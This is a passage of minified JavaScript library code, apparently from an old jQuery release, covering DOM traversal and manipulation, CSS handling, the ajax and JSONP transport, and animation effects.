break}if(f=f.parentNode,!f||!f.ownerDocument||f===b||11===f.nodeType)break}return e=e.length>1?K.unique(e):e,this.pushStack(e,"closest",a)},index:function(a){return a?"string"==typeof a?K.inArray(this[0],K(a)):K.inArray(a.jquery?a[0]:a,this):this[0]&&this[0].parentNode?this.prevAll().length:-1},add:function(a,b){var c="string"==typeof a?K(a,b):K.makeArray(a&&a.nodeType?[a]:a),d=K.merge(this.get(),c);
return this.pushStack(A(c[0])||A(d[0])?d:K.unique(d))},andSelf:function(){return this.add(this.prevObject)}}),K.each({parent:function(a){var b=a.parentNode;
return b&&11!==b.nodeType?b:null},parents:function(a){return K.dir(a,"parentNode")},parentsUntil:function(a,b,c){return K.dir(a,"parentNode",c)},next:function(a){return K.nth(a,2,"nextSibling")},prev:function(a){return K.nth(a,2,"previousSibling")},nextAll:function(a){return K.dir(a,"nextSibling")},prevAll:function(a){return K.dir(a,"previousSibling")},nextUntil:function(a,b,c){return K.dir(a,"nextSibling",c)},prevUntil:function(a,b,c){return K.dir(a,"previousSibling",c)},siblings:function(a){return K.sibling(a.parentNode.firstChild,a)},children:function(a){return K.sibling(a.firstChild)},contents:function(a){return K.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:K.makeArray(a.childNodes)}},function(a,b){K.fn[a]=function(c,d){var e=K.map(this,b,c);
return ia.test(a)||(d=c),d&&"string"==typeof d&&(e=K.filter(d,e)),e=this.length>1&&!oa[a]?K.unique(e):e,(this.length>1||ka.test(d))&&ja.test(a)&&(e=e.reverse()),this.pushStack(e,a,ma.call(arguments).join(","))}}),K.extend({filter:function(a,b,c){return c&&(a=":not("+a+")"),1===b.length?K.find.matchesSelector(b[0],a)?[b[0]]:[]:K.find.matches(a,b)},dir:function(a,c,d){for(var e=[],f=a[c];
f&&9!==f.nodeType&&(d===b||1!==f.nodeType||!K(f).is(d));
)1===f.nodeType&&e.push(f),f=f[c];
return e},nth:function(a,b,c,d){b=b||1;
for(var e=0;
a&&(1!==a.nodeType||++e!==b);
a=a[c]);
return a},sibling:function(a,b){for(var c=[];
a;
a=a.nextSibling)1===a.nodeType&&a!==b&&c.push(a);
return c}});
var pa="abbr|article|aside|audio|canvas|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",qa=/ jQuery\d+="(?:\d+|null)"/g,ra=/^\s+/,sa=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,ta=/<([\w:]+)/,ua=/<tbody/i,va=/<|&#?\w+;
/,wa=/<(?:script|style)/i,xa=/<(?:script|object|embed|option|style)/i,ya=new RegExp("<(?:"+pa+")","i"),za=/checked\s*(?:[^=]|=\s*.checked.)/i,Aa=/\/(java|ecma)script/i,Ba=/^\s*<!(?:\[CDATA\[|\-\-)/,Ca={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],_default:[0,"",""]},Da=y(H);
Ca.optgroup=Ca.option,Ca.tbody=Ca.tfoot=Ca.colgroup=Ca.caption=Ca.thead,Ca.th=Ca.td,K.support.htmlSerialize||(Ca._default=[1,"div<div>","</div>"]),K.fn.extend({text:function(a){return K.isFunction(a)?this.each(function(b){var c=K(this);
c.text(a.call(this,b,c.text()))}):"object"!=typeof a&&a!==b?this.empty().append((this[0]&&this[0].ownerDocument||H).createTextNode(a)):K.text(this)},wrapAll:function(a){if(K.isFunction(a))return this.each(function(b){K(this).wrapAll(a.call(this,b))});
if(this[0]){var b=K(a,this[0].ownerDocument).eq(0).clone(!0);
this[0].parentNode&&b.insertBefore(this[0]),b.map(function(){for(var a=this;
a.firstChild&&1===a.firstChild.nodeType;
)a=a.firstChild;
return a}).append(this)}return this},wrapInner:function(a){return K.isFunction(a)?this.each(function(b){K(this).wrapInner(a.call(this,b))}):this.each(function(){var b=K(this),c=b.contents();
c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){var b=K.isFunction(a);
return this.each(function(c){K(this).wrapAll(b?a.call(this,c):a)})},unwrap:function(){return this.parent().each(function(){K.nodeName(this,"body")||K(this).replaceWith(this.childNodes)}).end()},append:function(){return this.domManip(arguments,!0,function(a){1===this.nodeType&&this.appendChild(a)})},prepend:function(){return this.domManip(arguments,!0,function(a){1===this.nodeType&&this.insertBefore(a,this.firstChild)})},before:function(){
 if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this)});
if(arguments.length){var a=K.clean(arguments);
return a.push.apply(a,this.toArray()),this.pushStack(a,"before",arguments)}},after:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this.nextSibling)});
if(arguments.length){var a=this.pushStack(this,"after",arguments);
return a.push.apply(a,K.clean(arguments)),a}},remove:function(a,b){for(var c,d=0;
null!=(c=this[d]);
d++)(!a||K.filter(a,[c]).length)&&(!b&&1===c.nodeType&&(K.cleanData(c.getElementsByTagName("*")),K.cleanData([c])),c.parentNode&&c.parentNode.removeChild(c));
return this},empty:function(){for(var a,b=0;
null!=(a=this[b]);
b++)for(1===a.nodeType&&K.cleanData(a.getElementsByTagName("*"));
a.firstChild;
)a.removeChild(a.firstChild);
return this},clone:function(a,b){return a=null==a?!1:a,b=null==b?a:b,this.map(function(){return K.clone(this,a,b)})},html:function(a){if(a===b)return this[0]&&1===this[0].nodeType?this[0].innerHTML.replace(qa,""):null;
if("string"!=typeof a||wa.test(a)||!K.support.leadingWhitespace&&ra.test(a)||Ca[(ta.exec(a)||["",""])[1].toLowerCase()])K.isFunction(a)?this.each(function(b){var c=K(this);
c.html(a.call(this,b,c.html()))}):this.empty().append(a);
else{a=a.replace(sa,"<$1></$2>");
try{for(var c=0,d=this.length;
d>c;
c++)1===this[c].nodeType&&(K.cleanData(this[c].getElementsByTagName("*")),this[c].innerHTML=a)}catch(e){this.empty().append(a)}}return this},replaceWith:function(a){return this[0]&&this[0].parentNode?K.isFunction(a)?this.each(function(b){var c=K(this),d=c.html();
c.replaceWith(a.call(this,b,d))}):("string"!=typeof a&&(a=K(a).detach()),this.each(function(){var b=this.nextSibling,c=this.parentNode;
K(this).remove(),b?K(b).before(a):K(c).append(a)})):this.length?this.pushStack(K(K.isFunction(a)?a():a),"replaceWith",a):this},detach:function(a){return this.remove(a,!0)},domManip:function(a,c,d){var e,f,g,h,i=a[0],j=[];
if(!K.support.checkClone&&3===arguments.length&&"string"==typeof i&&za.test(i))return this.each(function(){K(this).domManip(a,c,d,!0)});
if(K.isFunction(i))return this.each(function(e){var f=K(this);
a[0]=i.call(this,e,c?f.html():b),f.domManip(a,c,d)});
if(this[0]){if(h=i&&i.parentNode,e=K.support.parentNode&&h&&11===h.nodeType&&h.childNodes.length===this.length?{fragment:h}:K.buildFragment(a,this,j),g=e.fragment,f=1===g.childNodes.length?g=g.firstChild:g.firstChild,f){c=c&&K.nodeName(f,"tr");
for(var k=0,l=this.length,m=l-1;
l>k;
k++)d.call(c?x(this[k],f):this[k],e.cacheable||l>1&&m>k?K.clone(g,!0,!0):g)}j.length&&K.each(j,q)}return this}}),K.buildFragment=function(a,b,c){var d,e,f,g,h=a[0];
return b&&b[0]&&(g=b[0].ownerDocument||b[0]),g.createDocumentFragment||(g=H),1===a.length&&"string"==typeof h&&h.length<512&&g===H&&"<"===h.charAt(0)&&!xa.test(h)&&(K.support.checkClone||!za.test(h))&&(K.support.html5Clone||!ya.test(h))&&(e=!0,f=K.fragments[h],f&&1!==f&&(d=f)),d||(d=g.createDocumentFragment(),K.clean(a,g,d,c)),e&&(K.fragments[h]=f?d:1),{fragment:d,cacheable:e}},K.fragments={},K.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){K.fn[a]=function(c){var d=[],e=K(c),f=1===this.length&&this[0].parentNode;
if(f&&11===f.nodeType&&1===f.childNodes.length&&1===e.length)return e[b](this[0]),this;
for(var g=0,h=e.length;
h>g;
g++){var i=(g>0?this.clone(!0):this).get();
K(e[g])[b](i),d=d.concat(i)}return this.pushStack(d,a,e.selector)}}),K.extend({clone:function(a,b,c){var d,e,f,g=K.support.html5Clone||!ya.test("<"+a.nodeName)?a.cloneNode(!0):r(a);
if(!(K.support.noCloneEvent&&K.support.noCloneChecked||1!==a.nodeType&&11!==a.nodeType||K.isXMLDoc(a)))for(v(a,g),d=u(a),e=u(g),f=0;
d[f];
++f)e[f]&&v(d[f],e[f]);
if(b&&(w(a,g),c))for(d=u(a),e=u(g),f=0;
d[f];
++f)w(d[f],e[f]);
return d=e=null,g},clean:function(a,b,c,d){var e;
b=b||H,"undefined"==typeof b.createElement&&(b=b.ownerDocument||b[0]&&b[0].ownerDocument||H);
for(var f,g,h=[],i=0;
null!=(g=a[i]);
i++)if("number"==typeof g&&(g+=""),g){if("string"==typeof g)if(va.test(g)){g=g.replace(sa,"<$1></$2>");
var j=(ta.exec(g)||["",""])[1].toLowerCase(),k=Ca[j]||Ca._default,l=k[0],m=b.createElement("div");
for(b===H?Da.appendChild(m):y(b).appendChild(m),m.innerHTML=k[1]+g+k[2];
l--;
)m=m.lastChild;
if(!K.support.tbody){var n=ua.test(g),o="table"!==j||n?"<table>"!==k[1]||n?[]:m.childNodes:m.firstChild&&m.firstChild.childNodes;
for(f=o.length-1;
f>=0;
--f)K.nodeName(o[f],"tbody")&&!o[f].childNodes.length&&o[f].parentNode.removeChild(o[f])}!K.support.leadingWhitespace&&ra.test(g)&&m.insertBefore(b.createTextNode(ra.exec(g)[0]),m.firstChild),g=m.childNodes}else g=b.createTextNode(g);
var p;
if(!K.support.appendChecked)if(g[0]&&"number"==typeof(p=g.length))for(f=0;
p>f;
f++)s(g[f]);
else s(g);
g.nodeType?h.push(g):h=K.merge(h,g)}if(c)for(e=function(a){return!a.type||Aa.test(a.type)},i=0;
h[i];
i++)if(!d||!K.nodeName(h[i],"script")||h[i].type&&"text/javascript"!==h[i].type.toLowerCase()){if(1===h[i].nodeType){var q=K.grep(h[i].getElementsByTagName("script"),e);
h.splice.apply(h,[i+1,0].concat(q))}c.appendChild(h[i])}else d.push(h[i].parentNode?h[i].parentNode.removeChild(h[i]):h[i]);
return h},cleanData:function(a){for(var b,c,d,e=K.cache,f=K.event.special,g=K.support.deleteExpando,h=0;
null!=(d=a[h]);
h++)if((!d.nodeName||!K.noData[d.nodeName.toLowerCase()])&&(c=d[K.expando])){if(b=e[c],b&&b.events){for(var i in b.events)f[i]?K.event.remove(d,i):K.removeEvent(d,i,b.handle);
b.handle&&(b.handle.elem=null)}g?delete d[K.expando]:d.removeAttribute&&d.removeAttribute(K.expando),delete e[c]}}});
var Ea,Fa,Ga,Ha=/alpha\([^)]*\)/i,Ia=/opacity=([^)]*)/,Ja=/([A-Z]|^ms)/g,Ka=/^-?\d+(?:px)?$/i,La=/^-?\d/,Ma=/^([\-+])=([\-+.\de]+)/,Na={position:"absolute",visibility:"hidden",display:"block"},Oa=["Left","Right"],Pa=["Top","Bottom"];
K.fn.css=function(a,c){return 2===arguments.length&&c===b?this:K.access(this,a,c,!0,function(a,c,d){return d!==b?K.style(a,c,d):K.css(a,c)})},K.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=Ea(a,"opacity","opacity");
return""===c?"1":c}return a.style.opacity}}},cssNumber:{fillOpacity:!0,fontWeight:!0,lineHeight:!0,opacity:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":K.support.cssFloat?"cssFloat":"styleFloat"},style:function(a,c,d,e){if(a&&3!==a.nodeType&&8!==a.nodeType&&a.style){var f,g,h=K.camelCase(c),i=a.style,j=K.cssHooks[h];
if(c=K.cssProps[h]||h,d===b)return j&&"get"in j&&(f=j.get(a,!1,e))!==b?f:i[c];
if(g=typeof d,"string"===g&&(f=Ma.exec(d))&&(d=+(f[1]+1)*+f[2]+parseFloat(K.css(a,c)),g="number"),null==d||"number"===g&&isNaN(d))return;
if("number"===g&&!K.cssNumber[h]&&(d+="px"),!(j&&"set"in j&&(d=j.set(a,d))===b))try{i[c]=d}catch(k){}}},css:function(a,c,d){var e,f;
return c=K.camelCase(c),f=K.cssHooks[c],c=K.cssProps[c]||c,"cssFloat"===c&&(c="float"),f&&"get"in f&&(e=f.get(a,!0,d))!==b?e:Ea?Ea(a,c):void 0},swap:function(a,b,c){var d={};
for(var e in b)d[e]=a.style[e],a.style[e]=b[e];
c.call(a);
for(e in b)a.style[e]=d[e]}}),K.curCSS=K.css,K.each(["height","width"],function(a,b){K.cssHooks[b]={get:function(a,c,d){var e;
return c?0!==a.offsetWidth?p(a,b,d):(K.swap(a,Na,function(){e=p(a,b,d)}),e):void 0},set:function(a,b){return Ka.test(b)?(b=parseFloat(b),b>=0?b+"px":void 0):b}}}),K.support.opacity||(K.cssHooks.opacity={get:function(a,b){return Ia.test((b&&a.currentStyle?a.currentStyle.filter:a.style.filter)||"")?parseFloat(RegExp.$1)/100+"":b?"1":""},set:function(a,b){var c=a.style,d=a.currentStyle,e=K.isNumeric(b)?"alpha(opacity="+100*b+")":"",f=d&&d.filter||c.filter||"";
c.zoom=1,b>=1&&""===K.trim(f.replace(Ha,""))&&(c.removeAttribute("filter"),d&&!d.filter)||(c.filter=Ha.test(f)?f.replace(Ha,e):f+" "+e)}}),K(function(){K.support.reliableMarginRight||(K.cssHooks.marginRight={get:function(a,b){var c;
return K.swap(a,{display:"inline-block"},function(){c=b?Ea(a,"margin-right","marginRight"):a.style.marginRight}),c}})}),H.defaultView&&H.defaultView.getComputedStyle&&(Fa=function(a,b){var c,d,e;
return b=b.replace(Ja,"-$1").toLowerCase(),(d=a.ownerDocument.defaultView)&&(e=d.getComputedStyle(a,null))&&(c=e.getPropertyValue(b),""===c&&!K.contains(a.ownerDocument.documentElement,a)&&(c=K.style(a,b))),c}),H.documentElement.currentStyle&&(Ga=function(a,b){var c,d,e,f=a.currentStyle&&a.currentStyle[b],g=a.style;
return null===f&&g&&(e=g[b])&&(f=e),!Ka.test(f)&&La.test(f)&&(c=g.left,d=a.runtimeStyle&&a.runtimeStyle.left,d&&(a.runtimeStyle.left=a.currentStyle.left),g.left="fontSize"===b?"1em":f||0,f=g.pixelLeft+"px",g.left=c,d&&(a.runtimeStyle.left=d)),""===f?"auto":f}),Ea=Fa||Ga,K.expr&&K.expr.filters&&(K.expr.filters.hidden=function(a){var b=a.offsetWidth,c=a.offsetHeight;
return 0===b&&0===c||!K.support.reliableHiddenOffsets&&"none"===(a.style&&a.style.display||K.css(a,"display"))},K.expr.filters.visible=function(a){return!K.expr.filters.hidden(a)});
var Qa,Ra,Sa=/%20/g,Ta=/\[\]$/,Ua=/\r?\n/g,Va=/#.*$/,Wa=/^(.*?):[ \t]*([^\r\n]*)\r?$/gm,Xa=/^(?:color|date|datetime|datetime-local|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i,Ya=/^(?:about|app|app\-storage|.+\-extension|file|res|widget):$/,Za=/^(?:GET|HEAD)$/,$a=/^\/\//,_a=/\?/,ab=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,bb=/^(?:select|textarea)/i,cb=/\s+/,db=/([?&])_=[^&]*/,eb=/^([\w\+\.\-]+:)(?:\/\/([^\/?#:]*)(?::(\d+))?)?/,fb=K.fn.load,gb={},hb={},ib=["*/"]+["*"];
try{Qa=J.href}catch(jb){Qa=H.createElement("a"),Qa.href="",Qa=Qa.href}Ra=eb.exec(Qa.toLowerCase())||[],K.fn.extend({load:function(a,c,d){if("string"!=typeof a&&fb)return fb.apply(this,arguments);
if(!this.length)return this;
var e=a.indexOf(" ");
if(e>=0){var f=a.slice(e,a.length);
a=a.slice(0,e)}var g="GET";
c&&(K.isFunction(c)?(d=c,c=b):"object"==typeof c&&(c=K.param(c,K.ajaxSettings.traditional),g="POST"));
var h=this;
return K.ajax({url:a,type:g,dataType:"html",data:c,complete:function(a,b,c){c=a.responseText,a.isResolved()&&(a.done(function(a){c=a}),h.html(f?K("<div>").append(c.replace(ab,"")).find(f):c)),d&&h.each(d,[c,b,a])}}),this},serialize:function(){return K.param(this.serializeArray())},serializeArray:function(){return this.map(function(){return this.elements?K.makeArray(this.elements):this}).filter(function(){return this.name&&!this.disabled&&(this.checked||bb.test(this.nodeName)||Xa.test(this.type))}).map(function(a,b){var c=K(this).val();
return null==c?null:K.isArray(c)?K.map(c,function(a,c){return{name:b.name,value:a.replace(Ua,"\r\n")}}):{name:b.name,value:c.replace(Ua,"\r\n")}}).get()}}),K.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "),function(a,b){K.fn[b]=function(a){return this.on(b,a)}}),K.each(["get","post"],function(a,c){K[c]=function(a,d,e,f){return K.isFunction(d)&&(f=f||e,e=d,d=b),K.ajax({type:c,url:a,data:d,success:e,dataType:f})}}),K.extend({getScript:function(a,c){return K.get(a,b,c,"script")},getJSON:function(a,b,c){return K.get(a,b,c,"json")},ajaxSetup:function(a,b){return b?m(a,K.ajaxSettings):(b=a,a=K.ajaxSettings),m(a,b),a},ajaxSettings:{url:Qa,isLocal:Ya.test(Ra[1]),global:!0,type:"GET",contentType:"application/x-www-form-urlencoded",processData:!0,async:!0,accepts:{xml:"application/xml, text/xml",html:"text/html",text:"text/plain",json:"application/json, text/javascript","*":ib},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText"},converters:{"* text":a.String,"text html":!0,"text json":K.parseJSON,"text xml":K.parseXML},flatOptions:{context:!0,url:!0}},ajaxPrefilter:o(gb),ajaxTransport:o(hb),ajax:function(a,c){function d(a,c,d,g){if(2!==x){x=2,i&&clearTimeout(i),h=b,f=g||"",y.readyState=a>0?4:0;
var l,n,o,v,w,z=c,A=d?k(p,y,d):b;
if(a>=200&&300>a||304===a)if(p.ifModified&&((v=y.getResponseHeader("Last-Modified"))&&(K.lastModified[e]=v),(w=y.getResponseHeader("Etag"))&&(K.etag[e]=w)),304===a)z="notmodified",l=!0;
else try{n=j(p,A),z="success",l=!0}catch(B){z="parsererror",o=B}else o=z,(!z||a)&&(z="error",0>a&&(a=0));
y.status=a,y.statusText=""+(c||z),l?s.resolveWith(q,[n,z,y]):s.rejectWith(q,[y,z,o]),y.statusCode(u),u=b,m&&r.trigger("ajax"+(l?"Success":"Error"),[y,p,l?n:o]),t.fireWith(q,[y,z]),m&&(r.trigger("ajaxComplete",[y,p]),--K.active||K.event.trigger("ajaxStop"))}}"object"==typeof a&&(c=a,a=b),c=c||{};
var e,f,g,h,i,l,m,o,p=K.ajaxSetup({},c),q=p.context||p,r=q!==p&&(q.nodeType||q instanceof K)?K(q):K.event,s=K.Deferred(),t=K.Callbacks("once memory"),u=p.statusCode||{},v={},w={},x=0,y={readyState:0,setRequestHeader:function(a,b){if(!x){var c=a.toLowerCase();
a=w[c]=w[c]||a,v[a]=b}return this},getAllResponseHeaders:function(){return 2===x?f:null},getResponseHeader:function(a){var c;
if(2===x){if(!g)for(g={};
c=Wa.exec(f);
)g[c[1].toLowerCase()]=c[2];
c=g[a.toLowerCase()]}return c===b?null:c},overrideMimeType:function(a){return x||(p.mimeType=a),this},abort:function(a){return a=a||"abort",h&&h.abort(a),d(0,a),this}};
if(s.promise(y),y.success=y.done,y.error=y.fail,y.complete=t.add,y.statusCode=function(a){if(a){var b;
if(2>x)for(b in a)u[b]=[u[b],a[b]];
else b=a[y.status],y.then(b,b)}return this},p.url=((a||p.url)+"").replace(Va,"").replace($a,Ra[1]+"//"),p.dataTypes=K.trim(p.dataType||"*").toLowerCase().split(cb),null==p.crossDomain&&(l=eb.exec(p.url.toLowerCase()),p.crossDomain=!(!l||l[1]==Ra[1]&&l[2]==Ra[2]&&(l[3]||("http:"===l[1]?80:443))==(Ra[3]||("http:"===Ra[1]?80:443)))),p.data&&p.processData&&"string"!=typeof p.data&&(p.data=K.param(p.data,p.traditional)),n(gb,p,c,y),2===x)return!1;
if(m=p.global,p.type=p.type.toUpperCase(),p.hasContent=!Za.test(p.type),m&&0===K.active++&&K.event.trigger("ajaxStart"),!p.hasContent&&(p.data&&(p.url+=(_a.test(p.url)?"&":"?")+p.data,delete p.data),e=p.url,p.cache===!1)){var z=K.now(),A=p.url.replace(db,"$1_="+z);
p.url=A+(A===p.url?(_a.test(p.url)?"&":"?")+"_="+z:"")}(p.data&&p.hasContent&&p.contentType!==!1||c.contentType)&&y.setRequestHeader("Content-Type",p.contentType),p.ifModified&&(e=e||p.url,K.lastModified[e]&&y.setRequestHeader("If-Modified-Since",K.lastModified[e]),K.etag[e]&&y.setRequestHeader("If-None-Match",K.etag[e])),y.setRequestHeader("Accept",p.dataTypes[0]&&p.accepts[p.dataTypes[0]]?p.accepts[p.dataTypes[0]]+("*"!==p.dataTypes[0]?", "+ib+";
 q=0.01":""):p.accepts["*"]);
for(o in p.headers)y.setRequestHeader(o,p.headers[o]);
if(p.beforeSend&&(p.beforeSend.call(q,y,p)===!1||2===x))return y.abort(),!1;
for(o in{success:1,error:1,complete:1})y[o](p[o]);
if(h=n(hb,p,c,y)){y.readyState=1,m&&r.trigger("ajaxSend",[y,p]),p.async&&p.timeout>0&&(i=setTimeout(function(){y.abort("timeout")},p.timeout));
try{x=1,h.send(v,d)}catch(B){if(!(2>x))throw B;
d(-1,B)}}else d(-1,"No Transport");
return y},param:function(a,c){var d=[],e=function(a,b){b=K.isFunction(b)?b():b,d[d.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)};
if(c===b&&(c=K.ajaxSettings.traditional),K.isArray(a)||a.jquery&&!K.isPlainObject(a))K.each(a,function(){e(this.name,this.value)});
else for(var f in a)l(f,a[f],c,e);
return d.join("&").replace(Sa,"+")}}),K.extend({active:0,lastModified:{},etag:{}});
var kb=K.now(),lb=/(\=)\?(&|$)|\?\?/i;
K.ajaxSetup({jsonp:"callback",jsonpCallback:function(){return K.expando+"_"+kb++}}),K.ajaxPrefilter("json jsonp",function(b,c,d){var e="application/x-www-form-urlencoded"===b.contentType&&"string"==typeof b.data;
if("jsonp"===b.dataTypes[0]||b.jsonp!==!1&&(lb.test(b.url)||e&&lb.test(b.data))){var f,g=b.jsonpCallback=K.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,h=a[g],i=b.url,j=b.data,k="$1"+g+"$2";
return b.jsonp!==!1&&(i=i.replace(lb,k),b.url===i&&(e&&(j=j.replace(lb,k)),b.data===j&&(i+=(/\?/.test(i)?"&":"?")+b.jsonp+"="+g))),b.url=i,b.data=j,a[g]=function(a){f=[a]},d.always(function(){a[g]=h,f&&K.isFunction(h)&&a[g](f[0])}),b.converters["script json"]=function(){return f||K.error(g+" was not called"),f[0]},b.dataTypes[0]="json","script"}}),K.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/javascript|ecmascript/},converters:{"text script":function(a){return K.globalEval(a),a}}}),K.ajaxPrefilter("script",function(a){a.cache===b&&(a.cache=!1),a.crossDomain&&(a.type="GET",a.global=!1)}),K.ajaxTransport("script",function(a){if(a.crossDomain){var c,d=H.head||H.getElementsByTagName("head")[0]||H.documentElement;
return{send:function(e,f){c=H.createElement("script"),c.async="async",a.scriptCharset&&(c.charset=a.scriptCharset),c.src=a.url,c.onload=c.onreadystatechange=function(a,e){(e||!c.readyState||/loaded|complete/.test(c.readyState))&&(c.onload=c.onreadystatechange=null,d&&c.parentNode&&d.removeChild(c),c=b,e||f(200,"success"))},d.insertBefore(c,d.firstChild)},abort:function(){c&&c.onload(0,1)}}}});
var mb,nb=a.ActiveXObject?function(){for(var a in mb)mb[a](0,1)}:!1,ob=0;
K.ajaxSettings.xhr=a.ActiveXObject?function(){return!this.isLocal&&i()||h()}:i,function(a){K.extend(K.support,{ajax:!!a,cors:!!a&&"withCredentials"in a})}(K.ajaxSettings.xhr()),K.support.ajax&&K.ajaxTransport(function(c){if(!c.crossDomain||K.support.cors){var d;
return{send:function(e,f){var g,h,i=c.xhr();
if(c.username?i.open(c.type,c.url,c.async,c.username,c.password):i.open(c.type,c.url,c.async),c.xhrFields)for(h in c.xhrFields)i[h]=c.xhrFields[h];
c.mimeType&&i.overrideMimeType&&i.overrideMimeType(c.mimeType),!c.crossDomain&&!e["X-Requested-With"]&&(e["X-Requested-With"]="XMLHttpRequest");
try{for(h in e)i.setRequestHeader(h,e[h])}catch(j){}i.send(c.hasContent&&c.data||null),d=function(a,e){var h,j,k,l,m;
try{if(d&&(e||4===i.readyState))if(d=b,g&&(i.onreadystatechange=K.noop,nb&&delete mb[g]),e)4!==i.readyState&&i.abort();
else{h=i.status,k=i.getAllResponseHeaders(),l={},m=i.responseXML,m&&m.documentElement&&(l.xml=m),l.text=i.responseText;
try{j=i.statusText}catch(n){j=""}h||!c.isLocal||c.crossDomain?1223===h&&(h=204):h=l.text?200:404}}catch(o){e||f(-1,o)}l&&f(h,j,l,k)},c.async&&4!==i.readyState?(g=++ob,nb&&(mb||(mb={},K(a).unload(nb)),mb[g]=d),i.onreadystatechange=d):d()},abort:function(){d&&d(0,1)}}}});
var pb,qb,rb,sb,tb={},ub=/^(?:toggle|show|hide)$/,vb=/^([+\-]=)?([\d+.\-]+)([a-z%]*)$/i,wb=[["height","marginTop","marginBottom","paddingTop","paddingBottom"],["width","marginLeft","marginRight","paddingLeft","paddingRight"],["opacity"]];
K.fn.extend({show:function(a,b,c){var f,g;
if(a||0===a)return this.animate(e("show",3),a,b,c);
for(var h=0,i=this.length;
i>h;
h++)f=this[h],f.style&&(g=f.style.display,!K._data(f,"olddisplay")&&"none"===g&&(g=f.style.display=""),""===g&&"none"===K.css(f,"display")&&K._data(f,"olddisplay",d(f.nodeName)));
for(h=0;
i>h;
h++)f=this[h],f.style&&(g=f.style.display,(""===g||"none"===g)&&(f.style.display=K._data(f,"olddisplay")||""));
return this},hide:function(a,b,c){if(a||0===a)return this.animate(e("hide",3),a,b,c);
for(var d,f,g=0,h=this.length;
h>g;
g++)d=this[g],d.style&&(f=K.css(d,"display"),"none"!==f&&!K._data(d,"olddisplay")&&K._data(d,"olddisplay",f));
for(g=0;
h>g;
g++)this[g].style&&(this[g].style.display="none");
return this},_toggle:K.fn.toggle,toggle:function(a,b,c){var d="boolean"==typeof a;
return K.isFunction(a)&&K.isFunction(b)?this._toggle.apply(this,arguments):null==a||d?this.each(function(){var b=d?a:K(this).is(":hidden");
K(this)[b?"show":"hide"]()}):this.animate(e("toggle",3),a,b,c),this},fadeTo:function(a,b,c,d){return this.filter(":hidden").css("opacity",0).show().end().animate({opacity:b},a,c,d)},animate:function(a,b,c,e){function f(){g.queue===!1&&K._mark(this);
var b,c,e,f,h,i,j,k,l,m=K.extend({},g),n=1===this.nodeType,o=n&&K(this).is(":hidden");
m.animatedProperties={};
for(e in a){if(b=K.camelCase(e),e!==b&&(a[b]=a[e],delete a[e]),c=a[b],K.isArray(c)?(m.animatedProperties[b]=c[1],c=a[b]=c[0]):m.animatedProperties[b]=m.specialEasing&&m.specialEasing[b]||m.easing||"swing","hide"===c&&o||"show"===c&&!o)return m.complete.call(this);
n&&("height"===b||"width"===b)&&(m.overflow=[this.style.overflow,this.style.overflowX,this.style.overflowY],"inline"===K.css(this,"display")&&"none"===K.css(this,"float")&&(K.support.inlineBlockNeedsLayout&&"inline"!==d(this.nodeName)?this.style.zoom=1:this.style.display="inline-block"))}null!=m.overflow&&(this.style.overflow="hidden");
for(e in a)f=new K.fx(this,m,e),c=a[e],ub.test(c)?(l=K._data(this,"toggle"+e)||("toggle"===c?o?"show":"hide":0),l?(K._data(this,"toggle"+e,"show"===l?"hide":"show"),f[l]()):f[c]()):(h=vb.exec(c),i=f.cur(),h?(j=parseFloat(h[2]),k=h[3]||(K.cssNumber[e]?"":"px"),"px"!==k&&(K.style(this,e,(j||1)+k),i=(j||1)/f.cur()*i,K.style(this,e,i+k)),h[1]&&(j=("-="===h[1]?-1:1)*j+i),f.custom(i,j,k)):f.custom(i,c,""));
return!0}var g=K.speed(b,c,e);
return K.isEmptyObject(a)?this.each(g.complete,[!1]):(a=K.extend({},a),g.queue===!1?this.each(f):this.queue(g.queue,f))},stop:function(a,c,d){return"string"!=typeof a&&(d=c,c=a,a=b),c&&a!==!1&&this.queue(a||"fx",[]),this.each(function(){function b(a,b,c){var e=b[c];
K.removeData(a,c,!0),e.stop(d)}var c,e=!1,f=K.timers,g=K._data(this);
if(d||K._unmark(!0,this),null==a)for(c in g)g[c]&&g[c].stop&&c.indexOf(".run")===c.length-4&&b(this,g,c);
else g[c=a+".run"]&&g[c].stop&&b(this,g,c);
for(c=f.length;
c--;
)f[c].elem===this&&(null==a||f[c].queue===a)&&(d?f[c](!0):f[c].saveState(),e=!0,f.splice(c,1));
(!d||!e)&&K.dequeue(this,a)})}}),K.each({slideDown:e("show",1),slideUp:e("hide",1),slideToggle:e("toggle",1),fadeIn:{opacity:"show"},fadeOut:{opacity:"hide"},fadeToggle:{opacity:"toggle"}},function(a,b){K.fn[a]=function(a,c,d){return this.animate(b,a,c,d)}}),K.extend({speed:function(a,b,c){var d=a&&"object"==typeof a?K.extend({},a):{complete:c||!c&&b||K.isFunction(a)&&a,duration:a,easing:c&&b||b&&!K.isFunction(b)&&b};
